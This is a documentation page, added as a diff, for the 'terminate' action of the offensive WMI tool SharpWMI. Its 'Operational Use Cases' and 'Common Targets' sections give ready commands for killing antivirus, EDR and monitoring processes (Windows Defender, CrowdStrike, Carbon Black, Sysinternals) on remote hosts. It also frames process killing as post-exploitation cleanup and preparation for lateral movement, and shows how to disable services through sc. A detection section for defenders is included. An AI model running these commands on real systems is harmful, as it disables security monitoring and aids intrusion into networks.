@@ -1,0 +1,378 @@
+---
+title: 'terminate'
+description: 'Terminate processes by name or PID on local and remote systems'
+icon: 'xmark'
+---
+
+## Overview
+
+The `terminate` action kills processes on local and remote systems using the `Win32_Process.Terminate` WMI method. It supports termination by process ID or process name.
+
+<Warning>
+  The terminate action kills only the **first matching process** found. For multiple instances of the same process, run the command multiple times.
+</Warning>
+
+## Syntax
+
+```bash
+SharpWMI.exe action=terminate process=PID|name [computername=HOST[,HOST2,...]] [username=DOMAIN\user] [password=Password]
+```
+
+## Parameters
+
+| Parameter | Required | Description |
+|-----------|----------|-------------|
+| `action` | Yes | Must be `terminate` |
+| `process` | Yes | Process ID (numeric) or process name |
+| `computername` | No | Target host(s), comma-separated. Defaults to localhost |
+| `username` | No | Username for authentication |
+| `password` | No | Password for authentication |
+
+## Usage Examples
+
+### Terminate by Name
+
+<CodeGroup>
+```bash Local Process
+SharpWMI.exe action=terminate process=notepad
+```
+
+```bash Remote Process
+SharpWMI.exe action=terminate process=powershell computername=target.domain.com
+```
+
+```bash With Credentials
+SharpWMI.exe action=terminate process=cmd computername=target.domain.com username="DOMAIN\admin" password="Password123!"
+```
+
+```bash Multiple Targets
+SharpWMI.exe action=terminate process=chrome computername=ws01,ws02,ws03
+```
+</CodeGroup>
+
+### Terminate by PID
+
+<CodeGroup>
+```bash By Process ID
+SharpWMI.exe action=terminate process=1234 computername=target.domain.com
+```
+
+```bash Specific PID Remote
+SharpWMI.exe action=terminate process=5678 computername=target.domain.com username="DOMAIN\admin" password="Password123!"
+```
+</CodeGroup>
+
+### Example Output
+
+```
+[+] Attempted to terminate remote process (notepad). Returned: 0
+```
+
+**Return values:**
+- `0` = Success
+- `2` = Access Denied
+- `3` = Insufficient Privilege
+- `8` = Unknown Failure
+- `9` = Path Not Found
+- `21` = Invalid Parameter
+
+## Operational Use Cases
+
+### Scenario 1: Kill Security Tools
+
+```bash
+# Terminate AV processes
+SharpWMI.exe action=terminate process=MsMpEng computername=target.domain.com
+
+# Kill EDR agents (use with caution - highly detectable)
+SharpWMI.exe action=terminate process=CrowdStrike computername=target.domain.com
+
+# Stop Windows Defender
+SharpWMI.exe action=terminate process=MsSense computername=target.domain.com
+```
+
+<Warning>
+  Terminating security tools is extremely detectable and may trigger immediate alerts. Use only when absolutely necessary.
+</Warning>
+
+### Scenario 2: Clean Up After Operations
+
+```bash
+# 1. Execute payload
+SharpWMI.exe action=exec computername=target command="C:\temp\tool.exe" result=true
+
+# 2. Terminate after completion
+SharpWMI.exe action=terminate process=tool computername=target
+```
+
+### Scenario 3: Kill Monitoring Processes
+
+```bash
+# Enumerate processes first
+SharpWMI.exe action=ps computername=target.domain.com
+
+# Terminate monitoring tools
+SharpWMI.exe action=terminate process=procmon computername=target.domain.com
+SharpWMI.exe action=terminate process=procexp computername=target.domain.com
+```
+
+### Scenario 4: Kill Specific PID
+
+```bash
+# 1. Find process PID
+SharpWMI.exe action=ps computername=target.domain.com
+
+# 2. Kill by specific PID
+SharpWMI.exe action=terminate process=3456 computername=target.domain.com
+```
+
+## Process Name Matching
+
+The `terminate` action uses a **partial name match** with `LIKE '%name%'`:
+
+```sql
+SELECT * FROM Win32_Process WHERE Name LIKE '%notepad%'
+```
+
+This means:
+- `process=note` will match `notepad.exe`
+- `process=explorer` will match `explorer.exe`
+- `process=svchost` will match `svchost.exe`
+
+<Tip>
+  You don't need to include `.exe` extension in process name.
+</Tip>
+
+## Remote vs Local Usage
+
+<Tabs>
+  <Tab title="Local Termination">
+    ```bash
+    SharpWMI.exe action=terminate process=notepad
+    ```
+
+    **When to use:**
+    - Post-exploitation cleanup
+    - Kill local monitoring tools
+    - Stop processes after execution
+
+    **Advantages:**
+    - No network traffic
+    - No authentication required
+  </Tab>
+
+  <Tab title="Remote Termination">
+    ```bash
+    SharpWMI.exe action=terminate process=notepad computername=target.domain.com
+    ```
+
+    **When to use:**
+    - Kill security tools before lateral movement
+    - Stop processes on compromised systems
+    - Clean up after remote operations
+
+    **Requirements:**
+    - Admin privileges on target
+    - WMI access over network
+  </Tab>
+</Tabs>
+
+## Limitations
+
+<CardGroup cols={2}>
+  <Card title="First Match Only" icon="1">
+    Terminates only the first matching process. For multiple instances, run multiple times.
+  </Card>
+
+  <Card title="Protected Processes" icon="shield">
+    Cannot terminate protected processes (PPL - Protected Process Light) without kernel access.
+  </Card>
+
+  <Card title="System Processes" icon="server">
+    Some critical system processes may cause system instability or crash if terminated.
+  </Card>
+
+  <Card title="Access Requirements" icon="key">
+    Requires admin privileges and may fail for processes owned by SYSTEM.
+  </Card>
+</CardGroup>
+
+## Detection Considerations
+
+<AccordionGroup>
+  <Accordion title="Process Termination Detection" icon="radar">
+    - Event ID 4689: Process termination
+    - Sysmon Event ID 5: Process terminated
+    - Unusual process terminations
+    - Security tool crashes
+    - Monitoring tool shutdowns
+  </Accordion>
+
+  <Accordion title="WMI Detection" icon="network-wired">
+    - WMI Terminate method invocation
+    - Event ID 5857: WMI activity
+    - Remote Win32_Process operations
+    - Sysmon Event ID 19-21: WMI activity
+  </Accordion>
+
+  <Accordion title="Behavioral Detection" icon="brain">
+    - AV/EDR process termination attempts
+    - Multiple process kills in succession
+    - Termination of security monitoring
+    - Correlation with other malicious activity
+  </Accordion>
+</AccordionGroup>
+
+## Best Practices
+
+<CardGroup cols={2}>
+  <Card title="Operational Security" icon="user-secret">
+    - Avoid killing security tools when possible
+    - Kill only necessary processes
+    - Be aware of detection risks
+    - Consider persistence of restarting services
+  </Card>
+
+  <Card title="Error Handling" icon="triangle-exclamation">
+    - Check return values
+    - Verify process was actually terminated
+    - Handle access denied gracefully
+    - Account for protected processes
+  </Card>
+
+  <Card title="Target Selection" icon="crosshairs">
+    - Identify process PID first with ps action
+    - Verify ownership before terminating
+    - Understand process purpose
+    - Consider impact on system stability
+  </Card>
+
+  <Card title="Cleanup Strategy" icon="broom">
+    - Terminate own tools after use
+    - Kill temporary processes
+    - Remove monitoring before operations
+    - Restore services if needed
+  </Card>
+</CardGroup>
+
+## Common Targets
+
+### Processes to Avoid Terminating
+
+<Warning>
+  Terminating these processes may cause system instability:
+</Warning>
+
+- `csrss.exe` - Critical system process
+- `smss.exe` - Session Manager
+- `winlogon.exe` - Windows Logon Process
+- `services.exe` - Service Control Manager
+- `lsass.exe` - Local Security Authority (system crash)
+
+### Common Targets
+
+**Monitoring Tools:**
+- `procmon.exe`, `procexp.exe` - Sysinternals
+- `wireshark.exe` - Network monitoring
+- `fiddler.exe` - Web proxy
+
+**Security Tools:**
+- `MsMpEng.exe` - Windows Defender
+- `cb.exe` - Carbon Black
+- `falcon-sensor.exe` - CrowdStrike
+
+## Troubleshooting
+
+<AccordionGroup>
+  <Accordion title="Process Not Found">
+    **Output:** `[x] Process notepad not found`
+
+    **Cause:** No matching process
+
+    **Solution:**
+    - Verify process is running: `SharpWMI.exe action=ps`
+    - Check process name spelling
+    - Process may have already terminated
+  </Accordion>
+
+  <Accordion title="Access Denied (Return: 2)">
+    **Cause:** Insufficient privileges
+
+    **Solution:**
+    - Verify admin credentials
+    - Some processes require SYSTEM privileges
+    - Use `username` and `password` parameters
+    - May need to elevate to SYSTEM context
+  </Accordion>
+
+  <Accordion title="Protected Process">
+    **Cause:** Process is protected (PPL)
+
+    **Solution:**
+    - Cannot terminate without kernel access
+    - Consider alternative approaches
+    - May require driver exploitation
+  </Accordion>
+
+  <Accordion title="Service Restarts">
+    **Cause:** Service automatically restarts
+
+    **Solution:**
+    - Stop the service instead of killing process
+    - Disable service auto-restart
+    - Use service control commands:
+      ```bash
+      SharpWMI.exe action=exec command="sc stop ServiceName" result=true
+      SharpWMI.exe action=exec command="sc config ServiceName start= disabled" result=true
+      ```
+  </Accordion>
+</AccordionGroup>
+
+## Return Value Reference
+
+| Return Value | Meaning | Action |
+|--------------|---------|--------|
+| 0 | Successful completion | Process terminated successfully |
+| 2 | Access denied | Use elevated credentials |
+| 3 | Insufficient privilege | Requires admin/SYSTEM |
+| 8 | Unknown failure | Check process state |
+| 9 | Path not found | Process doesn't exist |
+| 21 | Invalid parameter | Check process ID/name |
+
+## Related Actions
+
+<CardGroup cols={2}>
+  <Card title="ps" icon="list" href="/ghostpack-docs/SharpWMI-mdx/actions/ps">
+    List processes to find targets
+  </Card>
+  <Card title="exec" icon="terminal" href="/ghostpack-docs/SharpWMI-mdx/actions/exec">
+    Execute processes
+  </Card>
+  <Card title="query" icon="database" href="/ghostpack-docs/SharpWMI-mdx/actions/query">
+    Query Win32_Process directly
+  </Card>
+  <Card title="getenv" icon="eye" href="/ghostpack-docs/SharpWMI-mdx/actions/getenv">
+    Get environment variables
+  </Card>
+</CardGroup>
+
+## Alternative Methods
+
+<Accordion title="Terminate All Instances">
+  To kill all instances of a process, use a loop or custom query:
+
+  ```bash
+  # Using exec action with taskkill
+  SharpWMI.exe action=exec computername=target command="taskkill /F /IM notepad.exe /T" result=true
+  ```
+</Accordion>
+
+<Accordion title="Stop Windows Service">
+  ```bash
+  # Stop service
+  SharpWMI.exe action=exec computername=target command="sc stop ServiceName" result=true
+
+  # Disable service
+  SharpWMI.exe action=exec computername=target command="sc config ServiceName start= disabled" result=true
+  ```
+</Accordion>
